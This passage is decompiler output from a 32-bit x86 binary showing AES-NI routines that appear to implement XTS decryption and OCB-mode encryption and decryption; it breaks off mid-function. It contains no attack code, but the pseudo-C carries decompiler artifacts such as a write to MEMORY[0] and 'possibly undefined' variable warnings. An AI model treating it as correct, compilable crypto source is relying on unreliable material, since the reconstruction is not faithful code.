      v25 = _mm_and_si128(_mm_shuffle_epi32(v23, 19), v17);
      v26 = _mm_cmpgt_epi32((__m128i)0i64, v24);
      v126 = (__m128)_mm_xor_si128(v24, v25);
      v27 = _mm_add_epi64((__m128i)v126, (__m128i)v126);
      v28 = _mm_and_si128(_mm_shuffle_epi32(v26, 19), v17);
      v29 = _mm_cmpgt_epi32((__m128i)0i64, v27);
      v128 = (__m128)_mm_xor_si128(v27, v28);
      v30 = _mm_add_epi64((__m128i)v128, (__m128i)v128);
      v130 = (__m128)_mm_xor_si128(v30, _mm_and_si128(_mm_shuffle_epi32(v29, 19), v17));
      v31 = *(__m128i *)a4;
      v32 = _mm_xor_si128(
              _mm_and_si128(_mm_shuffle_epi32(_mm_cmpgt_epi32((__m128i)0i64, v30), 19), v17),
              _mm_add_epi64((__m128i)v130, (__m128i)v130));
      v33 = (__m128i)_mm_xor_ps(*(__m128 *)a1, *(__m128 *)a4);
      v34 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 16)), *(__m128i *)a4);
      v35 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 32)), *(__m128i *)a4);
      v36 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 48)), *(__m128i *)a4);
      v37 = _mm_loadu_si128((const __m128i *)(a1 + 80));
      v38 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 64)), *(__m128i *)a4);
      a1 += 96;
      _XMM2 = _mm_xor_si128(v33, (__m128i)v122);
      v131 = v32;
      v40 = _mm_xor_si128(v32, v37);
      _XMM1 = *(_OWORD *)(a4 + 16);
      _XMM3 = _mm_xor_si128(v34, (__m128i)v124);
      _XMM4 = _mm_xor_si128(v35, (__m128i)v126);
      __asm { aesdec  xmm2, xmm1 }
      _XMM5 = _mm_xor_si128(v36, (__m128i)v128);
      _XMM6 = _mm_xor_si128(v38, (__m128i)v130);
      __asm { aesdec  xmm3, xmm1 }
      _XMM7 = _mm_xor_si128(v40, v31);
      __asm
      {
        aesdec  xmm4, xmm1
        aesdec  xmm5, xmm1
        aesdec  xmm6, xmm1
        aesdec  xmm7, xmm1
      }
      v53 = ((int (__thiscall *)(int))loc_408C4E)(v20);
      v54 = (__m128)_mm_load_si128(&v131);
      *a2 = _mm_xor_ps(_XMM2, v122);
      a2[1] = _mm_xor_ps(_XMM3, v124);
      a2[2] = _mm_xor_ps(_XMM4, v126);
      a2[3] = _mm_xor_ps(_XMM5, v128);
      a2[4] = _mm_xor_ps(_XMM6, v130);
      v55 = _mm_shuffle_epi32(_mm_cmpgt_epi32((__m128i)0i64, (__m128i)v54), 19);
      a2[5] = _mm_xor_ps(_XMM7, v54);
      a2 += 6;
      v17 = _mm_load_si128(&v132);
      v56 = _mm_add_epi64((__m128i)v54, (__m128i)v54);
      v18 = _mm_cmpgt_epi32((__m128i)0i64, v56);
      v16 = (__m128)_mm_xor_si128(v56, _mm_and_si128(v55, v17));
      v57 = v53 < 0x60;
      v19 = v53 - 96;
    }
    while ( !v57 );
    v14 = *(_DWORD *)(a4 + 240);
    v13 = (_OWORD *)a4;
    v15 = v14;
  }
  v58 = v19 + 96;
  if ( !v58 )
  {
    result = v133 & 0xF;
    if ( (v133 & 0xF) == 0 )
      return result;
    v133 &= 0xFu;
    goto LABEL_23;
  }
  v59 = v16;
  if ( v58 < 0x20 )
  {
    v80 = *(__m128 *)a1;
    a1 += 16;
    v81 = _mm_xor_ps(v80, v16);
    v82 = *(__m128 *)v13;
    _XMM1 = v13[1];
    v84 = v13 + 2;
    _XMM2 = _mm_xor_ps(v81, v82);
    do
    {
      __asm { aesdec  xmm2, xmm1 }
      --v14;
      _XMM1 = *v84++;
    }
    while ( v14 );
    __asm { aesdeclast xmm2, xmm1 }
    *a2++ = _mm_xor_ps(_XMM2, v59);
    v63 = v59;
  }
  else
  {
    v60 = _mm_add_epi64((__m128i)v16, (__m128i)v16);
    v61 = _mm_and_si128(_mm_shuffle_epi32(v18, 19), v17);
    v62 = _mm_cmpgt_epi32((__m128i)0i64, v60);
    v63 = (__m128)_mm_xor_si128(v60, v61);
    if ( v58 == 32 )
    {
      v87 = *(__m128 *)a1;
      v88 = *(__m128 *)(a1 + 16);
      a1 += 32;
      v89 = _mm_xor_ps(v87, v59);
      v90 = _mm_xor_ps(v88, v63);
      sub_408880((int)v13, v14, v89, (__m128i)v90);
      *a2 = _mm_xor_ps(v89, v59);
      a2[1] = _mm_xor_ps(v90, v63);
      a2 += 2;
    }
    else
    {
      v64 = v63;
      v65 = _mm_add_epi64((__m128i)v63, (__m128i)v63);
      v66 = _mm_and_si128(_mm_shuffle_epi32(v62, 19), v17);
      v67 = _mm_cmpgt_epi32((__m128i)0i64, v65);
      v63 = (__m128)_mm_xor_si128(v65, v66);
      if ( v58 < 0x40 )
      {
        v91 = *(__m128 *)a1;
        v92 = *(__m128 *)(a1 + 16);
        v93 = *(__m128 *)(a1 + 32);
        a1 += 48;
        v94 = _mm_xor_ps(v91, v59);
        v95 = _mm_xor_ps(v92, v64);
        v96 = _mm_xor_ps(v93, v63);
        sub_408960((int)v13, v14, v94, (__m128i)v95, (__m128i)v96);
        *a2 = _mm_xor_ps(v94, v59);
        a2[1] = _mm_xor_ps(v95, v64);
        a2[2] = _mm_xor_ps(v96, v63);
        a2 += 3;
      }
      else
      {
        v68 = v63;
        v69 = _mm_add_epi64((__m128i)v63, (__m128i)v63);
        v70 = _mm_and_si128(_mm_shuffle_epi32(v67, 19), v17);
        v71 = _mm_cmpgt_epi32((__m128i)0i64, v69);
        v63 = (__m128)_mm_xor_si128(v69, v70);
        v123 = v59;
        v125 = v64;
        if ( v58 == 64 )
        {
          v97 = *(__m128 *)(a1 + 16);
          v98 = *(__m128 *)(a1 + 32);
          v99 = _mm_xor_ps(*(__m128 *)a1, v59);
          v100 = *(__m128 *)(a1 + 48);
          a1 += 64;
          v101 = _mm_xor_ps(v97, v64);
          v102 = _mm_xor_ps(v98, v68);
          v103 = _mm_xor_ps(v100, v63);
          sub_408A70((int)v13, v14, v99, (__m128i)v101, (__m128i)v102, (__m128i)v103);
          *a2 = _mm_xor_ps(v99, v123);
          a2[1] = _mm_xor_ps(v101, v64);
          a2[2] = _mm_xor_ps(v102, v68);
          a2[3] = _mm_xor_ps(v103, v63);
          a2 += 4;
        }
        else
        {
          v127 = v68;
          v129 = v63;
          v72 = (__m128)_mm_xor_si128(
                          _mm_and_si128(_mm_shuffle_epi32(v71, 19), v17),
                          _mm_add_epi64((__m128i)v63, (__m128i)v63));
          v73 = (__m128)_mm_xor_si128(_mm_loadu_si128((const __m128i *)a1), (__m128i)v59);
          v74 = _mm_loadu_si128((const __m128i *)(a1 + 48));
          v75 = (__m128)_mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 16)), (__m128i)v64);
          v76 = _mm_loadu_si128((const __m128i *)(a1 + 64));
          v77 = (__m128)_mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 32)), (__m128i)v127);
          a1 += 80;
          v78 = (__m128)_mm_xor_si128(v74, (__m128i)v63);
          v79 = (__m128)_mm_xor_si128(v76, (__m128i)v72);
          sub_408BE0((int)v13, v14, v73, (__m128i)v75, (__m128i)v77, (__m128i)v78, (__m128i)v79, (__m128i)v72);
          v63 = v72;
          *a2 = _mm_xor_ps(v73, v123);
          a2[1] = _mm_xor_ps(v75, v125);
          a2[2] = _mm_xor_ps(v77, v127);
          a2[3] = _mm_xor_ps(v78, v129);
          a2[4] = _mm_xor_ps(v79, v72);
          a2 += 5;
        }
      }
    }
  }
  result = v133 & 0xF;
  if ( (v133 & 0xF) != 0 )
  {
    v133 &= 0xFu;
    v105 = _mm_shuffle_epi32(_mm_cmpgt_epi32((__m128i)0i64, (__m128i)v63), 19);
    v17 = _mm_load_si128(&v132);
    v106 = _mm_add_epi64((__m128i)v63, (__m128i)v63);
    v18 = _mm_cmpgt_epi32((__m128i)0i64, v106);
    v16 = (__m128)_mm_xor_si128(v106, _mm_and_si128(v105, v17));
LABEL_23:
    v107 = v16;
    v108 = (__m128)_mm_xor_si128(
                     _mm_and_si128(_mm_shuffle_epi32(v18, 19), v17),
                     _mm_add_epi64((__m128i)v16, (__m128i)v16));
    v109 = v15;
    _XMM1 = *(_OWORD *)(a4 + 16);
    v111 = (__int128 *)(a4 + 32);
    _XMM2 = _mm_xor_ps(_mm_xor_ps(*(__m128 *)a1, v108), *(__m128 *)a4);
    do
    {
      __asm { aesdec  xmm2, xmm1 }
      --v109;
      _XMM1 = *v111++;
    }
    while ( v109 );
    __asm { aesdeclast xmm2, xmm1 }
    *a2 = _mm_xor_ps(_XMM2, v108);
    do
    {
      v114 = *(_BYTE *)(a1 + 16);
      v115 = a2->m128_i8[0];
      ++a1;
      a2->m128_i8[0] = v114;
      a2[1].m128_i8[0] = v115;
      a2 = (__m128 *)((char *)a2 + 1);
      --result;
    }
    while ( result );
    v116 = (__m128 *)((char *)a2 - v133);
    v117 = v15;
    _XMM1 = *(_OWORD *)(a4 + 16);
    v119 = (__int128 *)(a4 + 32);
    _XMM2 = _mm_xor_ps(_mm_xor_ps(*v116, v107), *(__m128 *)a4);
    do
    {
      __asm { aesdec  xmm2, xmm1 }
      --v117;
      _XMM1 = *v119++;
    }
    while ( v117 );
    __asm { aesdeclast xmm2, xmm1 }
    *v116 = _mm_xor_ps(_XMM2, v107);
  }
  return result;
}

//----- (0040A230) --------------------------------------------------------
unsigned int __cdecl sub_40A230(
        const __m128i *a1,
        __m128 *a2,
        int a3,
        int a4,
        unsigned int a5,
        const __m128i *a6,
        const __m128i *a7,
        const __m128i *a8)
{
  const __m128i *v8; // esi
  int v9; // edx
  __m128i v10; // xmm0
  unsigned int v11; // ebp
  __m128i v12; // xmm1
  unsigned int v13; // eax
  int v14; // ecx
  unsigned int v15; // eax
  __m128i v16; // xmm2
  __m128 v17; // xmm7
  __m128i v18; // xmm6
  __int128 *v20; // edx
  int v23; // ecx
  int v24; // edx
  unsigned int v25; // ecx
  unsigned int v26; // eax
  unsigned int v27; // edi
  __m128i v28; // xmm6
  __m128i v29; // xmm0
  __m128i v30; // xmm2
  __m128i v31; // xmm3
  __m128i v32; // xmm4
  __m128i v33; // xmm5
  __m128i v34; // xmm6
  __m128i v35; // xmm7
  int v49; // edi
  __m128i v50; // xmm6
  unsigned int result; // eax
  int v52; // ecx
  unsigned int v53; // eax
  __m128i v54; // xmm6
  __m128i v55; // xmm0
  __m128i v56; // xmm2
  __m128i v57; // xmm3
  __m128i v58; // xmm4
  __m128i v59; // xmm5
  __m128i v60; // xmm6
  int v74; // edi
  __m128i v75; // xmm6
  __m128i v76; // xmm2
  int v77; // ecx
  __m128 v78; // xmm7
  __m128i v79; // xmm6
  __int128 *v81; // edx
  unsigned int v84; // ecx
  __m128i v85; // xmm2
  __m128i v86; // xmm3
  __m128 v87; // xmm6
  __m128 v88; // xmm7
  __m128i v89; // xmm1
  __m128 v90; // xmm2
  __m128 v91; // xmm3
  int v92; // edi
  unsigned int v93; // ecx
  __m128i v94; // xmm6
  __m128i v95; // xmm7
  __m128i v96; // xmm2
  __m128i v97; // xmm3
  __m128i v98; // xmm4
  int v99; // ecx
  __m128 v100; // xmm5
  __m128 v101; // xmm6
  __m128 v102; // xmm7
  __m128i v103; // xmm1
  __m128 v104; // xmm2
  __m128i v105; // xmm1
  __m128 v106; // xmm3
  __m128i v107; // xmm1
  __m128 v108; // xmm4
  int v109; // edi
  unsigned int v110; // eax
  __m128i v111; // xmm6
  __m128i v112; // xmm4
  __m128i v113; // xmm2
  __m128i v114; // xmm5
  __m128i v115; // xmm3
  __m128 v116; // xmm6
  __m128 v117; // xmm7
  __m128i v118; // xmm4
  __m128i v119; // xmm5
  int v120; // ecx
  __m128i v121; // xmm1
  __m128 v122; // xmm2
  __m128i v123; // xmm1
  __m128 v124; // xmm3
  __m128i v125; // xmm1
  __m128 v126; // xmm4
  __m128i v127; // xmm1
  __m128 v128; // xmm5
  int v129; // edi
  __m128i v130; // [esp+0h] [ebp-94h]
  __m128i v131; // [esp+0h] [ebp-94h]
  __m128 v132; // [esp+0h] [ebp-94h]
  __m128i v133; // [esp+10h] [ebp-84h]
  __m128i v134; // [esp+10h] [ebp-84h]
  __m128 v135; // [esp+10h] [ebp-84h]
  __m128i v136; // [esp+20h] [ebp-74h]
  __m128i v137; // [esp+20h] [ebp-74h]
  __m128i v138; // [esp+30h] [ebp-64h]
  __m128i v139; // [esp+30h] [ebp-64h]
  __m128i v140; // [esp+40h] [ebp-54h] BYREF
  __m128i v141; // [esp+50h] [ebp-44h] BYREF
  __m128i v142; // [esp+60h] [ebp-34h] BYREF
  int v143; // [esp+70h] [ebp-24h]
  int v144; // [esp+74h] [ebp-20h]
  int v145; // [esp+78h] [ebp-1Ch]
  unsigned int v146; // [esp+7Ch] [ebp-18h]
  int *v147; // [esp+80h] [ebp-14h]
  int v148; // [esp+84h] [ebp-10h] BYREF

  v8 = a1;
  v9 = a4;
  v10 = _mm_loadu_si128(a6);
  v11 = a5;
  v12 = _mm_loadu_si128(a8);
  v13 = (unsigned int)&a1[a3 - 6];
  v145 = (char *)a2 - (char *)a1;
  v146 = v13;
  v147 = &v148;
  v14 = *(_DWORD *)(a4 + 240);
  if ( (a5 & 1) == 0 )
  {
    _BitScanForward(&v15, a5);
    v11 = a5 + 1;
    v16 = _mm_loadu_si128(a1);
    v8 = a1 + 1;
    v17 = (__m128)_mm_xor_si128(_mm_loadu_si128(&a7[v15]), v10);
    v18 = _mm_xor_si128(v12, v16);
    _XMM1 = *(_OWORD *)(a4 + 16);
    v20 = (__int128 *)(a4 + 32);
    _XMM2 = _mm_xor_ps((__m128)_mm_xor_si128(v16, (__m128i)v17), *(__m128 *)a4);
    do
    {
      __asm { aesenc  xmm2, xmm1 }
      --v14;
      _XMM1 = *v20++;
    }
    while ( v14 );
    __asm { aesenclast xmm2, xmm1 }
    v10 = (__m128i)v17;
    v12 = v18;
    *a2 = _mm_xor_ps(_XMM2, v17);
    v14 = *(_DWORD *)(a4 + 240);
    v9 = a4;
    v13 = v146;
  }
  v23 = 16 * v14;
  v143 = v9;
  v24 = v9 + v23 + 32;
  v144 = 16 - v23;
  if ( (unsigned int)v8 <= v13 )
  {
    do
    {
      v25 = v11 + 1;
      v26 = v11 + 3;
      v27 = v11 + 5;
      v11 += 6;
      _BitScanForward(&v25, v25);
      _BitScanForward(&v26, v26);
      _BitScanForward(&v27, v27);
      v28 = _mm_loadu_si128(a7);
      v130 = _mm_xor_si128(v28, v10);
      v133 = _mm_xor_si128(_mm_loadu_si128(&a7[v25]), v130);
      v136 = _mm_xor_si128(v28, v133);
      v138 = _mm_xor_si128(_mm_loadu_si128(&a7[v26]), v136);
      v140 = _mm_xor_si128(v28, v138);
      v141 = _mm_xor_si128(_mm_loadu_si128(&a7[v27]), v140);
      v29 = *(__m128i *)(v24 + v144 - 48);
      v30 = _mm_loadu_si128(v8);
      v31 = _mm_loadu_si128(v8 + 1);
      v32 = _mm_loadu_si128(v8 + 2);
      v33 = _mm_loadu_si128(v8 + 3);
      v34 = _mm_loadu_si128(v8 + 4);
      v35 = _mm_loadu_si128(v8 + 5);
      v8 += 6;
      v142 = _mm_xor_si128(
               _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v12, v30), v31), v32), v33), v34),
               v35);
      _XMM1 = *(_OWORD *)(v24 + v144 - 32);
      _XMM2 = _mm_xor_si128(_mm_xor_si128(v30, v29), v130);
      _XMM3 = _mm_xor_si128(_mm_xor_si128(v31, v29), v133);
      _XMM4 = _mm_xor_si128(_mm_xor_si128(v32, v29), v136);
      _XMM5 = _mm_xor_si128(_mm_xor_si128(v33, v29), v138);
      _XMM6 = _mm_xor_si128(_mm_xor_si128(v34, v29), v140);
      _XMM7 = _mm_xor_si128(_mm_xor_si128(v35, v29), v141);
      __asm
      {
        aesenc  xmm2, xmm1
        aesenc  xmm3, xmm1
        aesenc  xmm4, xmm1
        aesenc  xmm5, xmm1
        aesenc  xmm6, xmm1
        aesenc  xmm7, xmm1
      }
      v49 = v145;
      sub_408B6E(v24, v144, *(_OWORD *)(v24 + v144 - 16), _XMM2, _XMM3, _XMM4, _XMM5, _XMM6, _XMM7);
      v10 = _mm_load_si128(&v141);
      v50 = _mm_xor_si128((__m128i)_XMM6, v140);
      v12 = _mm_load_si128(&v142);
      *(const __m128i *)((char *)&v8[-6] + v49) = _mm_xor_si128((__m128i)_XMM2, v130);
      *(const __m128i *)((char *)&v8[-5] + v49) = _mm_xor_si128((__m128i)_XMM3, v133);
      *(const __m128i *)((char *)&v8[-4] + v49) = _mm_xor_si128((__m128i)_XMM4, v136);
      *(const __m128i *)((char *)&v8[-3] + v49) = _mm_xor_si128((__m128i)_XMM5, v138);
      *(__m128i *)((char *)&v8[-2] + v49) = v50;
      *(const __m128i *)((char *)&v8[-1] + v49) = _mm_xor_si128((__m128i)_XMM7, v10);
    }
    while ( (unsigned int)v8 < v13 );
  }
  result = v13 + 96 - (_DWORD)v8;
  if ( result )
  {
    if ( result < 0x20 )
    {
      v76 = _mm_loadu_si128(v8);
      v77 = *(_DWORD *)(v143 + 240);
      v78 = (__m128)_mm_xor_si128(_mm_loadu_si128(a7), v10);
      v79 = _mm_xor_si128(v12, v76);
      _XMM1 = *(_OWORD *)(v143 + 16);
      v81 = (__int128 *)(v143 + 32);
      _XMM2 = _mm_xor_ps((__m128)_mm_xor_si128(v76, (__m128i)v78), *(__m128 *)v143);
      do
      {
        __asm { aesenc  xmm2, xmm1 }
        --v77;
        _XMM1 = *v81++;
      }
      while ( v77 );
      __asm { aesenclast xmm2, xmm1 }
      v12 = v79;
      *(__m128 *)((char *)v8 + v145) = _mm_xor_ps(_XMM2, v78);
    }
    else if ( result == 32 )
    {
      _BitScanForward(&v84, v11 + 1);
      v85 = _mm_loadu_si128(v8);
      v86 = _mm_loadu_si128(v8 + 1);
      v87 = (__m128)_mm_xor_si128(_mm_loadu_si128(a7), v10);
      v88 = (__m128)_mm_xor_si128(_mm_loadu_si128(&a7[v84]), (__m128i)v87);
      v89 = _mm_xor_si128(v12, v85);
      v90 = (__m128)_mm_xor_si128(v85, (__m128i)v87);
      v12 = _mm_xor_si128(v89, v86);
      v91 = (__m128)_mm_xor_si128(v86, (__m128i)v88);
      v92 = v145;
      sub_408820(v143, *(_DWORD *)(v143 + 240), v90, (__m128i)v91);
      *(__m128 *)((char *)v8 + v92) = _mm_xor_ps(v90, v87);
      *(__m128 *)((char *)&v8[1] + v92) = _mm_xor_ps(v91, v88);
    }
    else if ( result < 0x40 )
    {
      _BitScanForward(&v93, v11 + 1);
      v94 = _mm_loadu_si128(&a7[v93]);
      v95 = _mm_loadu_si128(a7);
      v96 = _mm_loadu_si128(v8);
      v97 = _mm_loadu_si128(v8 + 1);
      v98 = _mm_loadu_si128(v8 + 2);
      v99 = *(_DWORD *)(v143 + 240);
      v100 = (__m128)_mm_xor_si128(v95, v10);
      v101 = (__m128)_mm_xor_si128(v94, (__m128i)v100);
      v102 = (__m128)_mm_xor_si128(v95, (__m128i)v101);
      v103 = _mm_xor_si128(v12, v96);
      v104 = (__m128)_mm_xor_si128(v96, (__m128i)v100);
      v105 = _mm_xor_si128(v103, v97);
      v106 = (__m128)_mm_xor_si128(v97, (__m128i)v101);
      v107 = _mm_xor_si128(v105, v98);
      v108 = (__m128)_mm_xor_si128(v98, (__m128i)v102);
      v142 = v107;
      v109 = v145;
      sub_4088E0(v143, v99, v104, (__m128i)v106, (__m128i)v108);
      v12 = _mm_load_si128(&v142);
      *(__m128 *)((char *)v8 + v109) = _mm_xor_ps(v104, v100);
      *(__m128 *)((char *)&v8[1] + v109) = _mm_xor_ps(v106, v101);
      *(__m128 *)((char *)&v8[2] + v109) = _mm_xor_ps(v108, v102);
    }
    else
    {
      _BitScanForward((unsigned int *)&v52, v11 + 1);
      if ( result == 64 )
      {
        _BitScanForward(&v110, v11 + 3);
        v111 = _mm_loadu_si128(a7);
        v112 = _mm_xor_si128(v111, v10);
        v113 = _mm_loadu_si128(v8);
        v114 = _mm_xor_si128(_mm_loadu_si128(&a7[v52]), v112);
        v115 = _mm_loadu_si128(v8 + 1);
        v116 = (__m128)_mm_xor_si128(v111, v114);
        v132 = (__m128)v112;
        v117 = (__m128)_mm_xor_si128(_mm_loadu_si128(&a7[v110]), (__m128i)v116);
        v135 = (__m128)v114;
        v118 = _mm_loadu_si128(v8 + 2);
        v119 = _mm_loadu_si128(v8 + 3);
        v120 = *(_DWORD *)(v143 + 240);
        v121 = _mm_xor_si128(v12, v113);
        v122 = (__m128)_mm_xor_si128(v113, (__m128i)v132);
        v123 = _mm_xor_si128(v121, v115);
        v124 = (__m128)_mm_xor_si128(v115, (__m128i)v135);
        v125 = _mm_xor_si128(v123, v118);
        v126 = (__m128)_mm_xor_si128(v118, (__m128i)v116);
        v127 = _mm_xor_si128(v125, v119);
        v128 = (__m128)_mm_xor_si128(v119, (__m128i)v117);
        v142 = v127;
        v129 = v145;
        sub_4089E0(v143, v120, v122, (__m128i)v124, (__m128i)v126, (__m128i)v128);
        *(__m128 *)((char *)v8 + v129) = _mm_xor_ps(v122, v132);
        *(__m128 *)((char *)&v8[1] + v129) = _mm_xor_ps(v124, v135);
        *(__m128 *)((char *)&v8[2] + v129) = _mm_xor_ps(v126, v116);
        v12 = _mm_load_si128(&v142);
        *(__m128 *)((char *)&v8[3] + v129) = _mm_xor_ps(v128, v117);
      }
      else
      {
        _BitScanForward(&v53, v11 + 3);
        v54 = _mm_loadu_si128(a7);
        v131 = _mm_xor_si128(v54, v10);
        v134 = _mm_xor_si128(_mm_loadu_si128(&a7[v52]), v131);
        v137 = _mm_xor_si128(v54, v134);
        v139 = _mm_xor_si128(_mm_loadu_si128(&a7[v53]), v137);
        v140 = _mm_xor_si128(v54, v139);
        v55 = *(__m128i *)(v24 + v144 - 48);
        v56 = _mm_loadu_si128(v8);
        v57 = _mm_loadu_si128(v8 + 1);
        v58 = _mm_loadu_si128(v8 + 2);
        v59 = _mm_loadu_si128(v8 + 3);
        v60 = _mm_loadu_si128(v8 + 4);
        _XMM7 = 0i64;
        v142 = _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v12, v56), v57), v58), v59), v60);
        _XMM1 = *(_OWORD *)(v24 + v144 - 32);
        _XMM2 = _mm_xor_si128(_mm_xor_si128(v56, v55), v131);
        _XMM3 = _mm_xor_si128(_mm_xor_si128(v57, v55), v134);
        _XMM4 = _mm_xor_si128(_mm_xor_si128(v58, v55), v137);
        _XMM5 = _mm_xor_si128(_mm_xor_si128(v59, v55), v139);
        _XMM6 = _mm_xor_si128(_mm_xor_si128(v60, v55), v140);
        __asm
        {
          aesenc  xmm2, xmm1
          aesenc  xmm3, xmm1
          aesenc  xmm4, xmm1
          aesenc  xmm5, xmm1
          aesenc  xmm6, xmm1
          aesenc  xmm7, xmm1
        }
        v74 = v145;
        sub_408B6E(v24, v144, *(_OWORD *)(v24 + v144 - 16), _XMM2, _XMM3, _XMM4, _XMM5, _XMM6, _XMM7);
        v75 = _mm_xor_si128((__m128i)_XMM6, _mm_load_si128(&v140));
        v12 = _mm_load_si128(&v142);
        *(const __m128i *)((char *)v8 + v74) = _mm_xor_si128((__m128i)_XMM2, v131);
        *(const __m128i *)((char *)&v8[1] + v74) = _mm_xor_si128((__m128i)_XMM3, v134);
        *(const __m128i *)((char *)&v8[2] + v74) = _mm_xor_si128((__m128i)_XMM4, v137);
        *(const __m128i *)((char *)&v8[3] + v74) = _mm_xor_si128((__m128i)_XMM5, v139);
        *(__m128i *)((char *)&v8[4] + v74) = v75;
      }
    }
  }
  MEMORY[0] = v12;
  return result;
}
// 40A398: variable 'v24' is possibly undefined
// 40A49E: variable 'v13' is possibly undefined

//----- (0040A8B0) --------------------------------------------------------
unsigned int __cdecl sub_40A8B0(
        const __m128i *a1,
        __m128 *a2,
        int a3,
        int a4,
        unsigned int a5,
        const __m128i *a6,
        const __m128i *a7,
        const __m128i *a8)
{
  const __m128i *v8; // esi
  int v9; // edx
  __m128i v10; // xmm0
  unsigned int v11; // ebp
  __m128 v12; // xmm1
  unsigned int v13; // eax
  int v14; // ecx
  unsigned int v15; // eax
  __m128 v16; // xmm7
  __m128 v17; // xmm6
  __int128 *v19; // edx
  __m128 v22; // xmm2
  int v23; // ecx
  int v24; // edx
  unsigned int v25; // ecx
  unsigned int v26; // eax
  unsigned int v27; // edi
  __m128i v28; // xmm6
  __m128i v29; // xmm0
  __m128i v30; // xmm2
  __m128i v31; // xmm3
  __m128i v32; // xmm4
  __m128i v33; // xmm5
  __m128i v34; // xmm6
  __m128i v35; // xmm7
  int v49; // edi
  __m128i v50; // xmm2
  __m128i v51; // xmm3
  __m128i v52; // xmm4
  __m128i v53; // xmm5
  __m128i v54; // xmm6
  __m128i v55; // xmm7
  __m128i v56; // xmm1
  unsigned int result; // eax
  int v58; // ecx
  unsigned int v59; // eax
  __m128i v60; // xmm6
  __m128i v61; // xmm0
  __m128i v62; // xmm2
  __m128i v63; // xmm3
  __m128i v64; // xmm4
  __m128i v65; // xmm5
  __m128i v66; // xmm6
  int v80; // edi
  __m128i v81; // xmm2
  __m128i v82; // xmm3
  __m128i v83; // xmm4
  __m128i v84; // xmm5
  __m128i v85; // xmm6
  __m128i v86; // xmm1
  int v87; // ecx
  __m128 v88; // xmm7
  __m128 v89; // xmm6
  __int128 *v91; // edx
  __m128 v94; // xmm2
  unsigned int v95; // ecx
  __m128 v96; // xmm6
  __m128 v97; // xmm7
  __m128 v98; // xmm2
  __m128 v99; // xmm3
  int v100; // edi
  __m128 v101; // xmm2
  __m128 v102; // xmm3
  unsigned int v103; // ecx
  __m128i v104; // xmm6
  __m128i v105; // xmm7
  __m128i v106; // xmm2
  __m128i v107; // xmm3
  __m128i v108; // xmm4
  int v109; // ecx
  __m128 v110; // xmm5
  __m128 v111; // xmm6
  __m128 v112; // xmm7
  __m128 v113; // xmm2
  __m128 v114; // xmm3
  __m128 v115; // xmm4
  int v116; // edi
  __m128i v117; // xmm1
  __m128i v118; // xmm2
  __m128i v119; // xmm3
  __m128i v120; // xmm4
  unsigned int v121; // eax
  __m128i v122; // xmm6
  __m128i v123; // xmm4
  __m128i v124; // xmm2
  __m128i v125; // xmm5
  __m128i v126; // xmm3
  __m128 v127; // xmm6
  __m128 v128; // xmm7
  __m128i v129; // xmm4
  __m128i v130; // xmm5
  int v131; // ecx
  __m128 v132; // xmm2
  __m128 v133; // xmm3
  __m128 v134; // xmm4
  __m128 v135; // xmm5
  int v136; // edi
  __m128i v137; // xmm1
  __m128i v138; // xmm2
  __m128i v139; // xmm3
  __m128i v140; // xmm4
  __m128i v141; // xmm5
  __m128i v142; // [esp+0h] [ebp-94h]
  __m128i v143; // [esp+0h] [ebp-94h]
  __m128 v144; // [esp+0h] [ebp-94h]
  __m128i v145; // [esp+10h] [ebp-84h]
  __m128i v146; // [esp+10h] [ebp-84h]
  __m128 v147; // [esp+10h] [ebp-84h]
  __m128i v148; // [esp+20h] [ebp-74h]
  __m128i v149; // [esp+20h] [ebp-74h]
  __m128i v150; // [esp+30h] [ebp-64h]
  __m128i v151; // [esp+30h] [ebp-64h]
  __m128i v152; // [esp+40h] [ebp-54h] BYREF
  __m128i v153; // [esp+50h] [ebp-44h] BYREF
  __m128i v154; // [esp+60h] [ebp-34h] BYREF
  int v155; // [esp+70h] [ebp-24h]
  int v156; // [esp+74h] [ebp-20h]
  int v157; // [esp+78h] [ebp-1Ch]
  unsigned int v158; // [esp+7Ch] [ebp-18h]
  int *v159; // [esp+80h] [ebp-14h]
  int v160; // [esp+84h] [ebp-10h] BYREF

  v8 = a1;
  v9 = a4;
  v10 = _mm_loadu_si128(a6);
  v11 = a5;
  v12 = (__m128)_mm_loadu_si128(a8);
  v13 = (unsigned int)&a1[a3 - 6];
  v157 = (char *)a2 - (char *)a1;
  v158 = v13;
  v159 = &v160;
  v14 = *(_DWORD *)(a4 + 240);
  if ( (a5 & 1) == 0 )
  {
    _BitScanForward(&v15, a5);
    v11 = a5 + 1;
    v8 = a1 + 1;
    v16 = (__m128)_mm_xor_si128(_mm_loadu_si128(&a7[v15]), v10);
    v17 = v12;
    _XMM1 = *(_OWORD *)(a4 + 16);
    v19 = (__int128 *)(a4 + 32);
    _XMM2 = _mm_xor_ps((__m128)_mm_xor_si128(_mm_loadu_si128(a1), (__m128i)v16), *(__m128 *)a4);
    do
    {
      __asm { aesdec  xmm2, xmm1 }
      --v14;
      _XMM1 = *v19++;
    }
    while ( v14 );
    __asm { aesdeclast xmm2, xmm1 }
    v22 = _mm_xor_ps(_XMM2, v16);
    v10 = (__m128i)v16;
    v12 = _mm_xor_ps(v17, v22);
    *a2 = v22;
    v14 = *(_DWORD *)(a4 + 240);
    v9 = a4;
    v13 = v158;
  }
  v23 = 16 * v14;
  v155 = v9;
  v24 = v9 + v23 + 32;
  v156 = 16 - v23;
  if ( (unsigned int)v8 <= v13 )
  {
    do
    {
      v25 = v11 + 1;
      v26 = v11 + 3;
      v27 = v11 + 5;
      v11 += 6;
      _BitScanForward(&v25, v25);
      _BitScanForward(&v26, v26);
      _BitScanForward(&v27, v27);
      v28 = _mm_loadu_si128(a7);
      v142 = _mm_xor_si128(v28, v10);
      v145 = _mm_xor_si128(_mm_loadu_si128(&a7[v25]), v142);
      v148 = _mm_xor_si128(v28, v145);
      v150 = _mm_xor_si128(_mm_loadu_si128(&a7[v26]), v148);
      v152 = _mm_xor_si128(v28, v150);
      v153 = _mm_xor_si128(_mm_loadu_si128(&a7[v27]), v152);
      v29 = *(__m128i *)(v24 + v156 - 48);
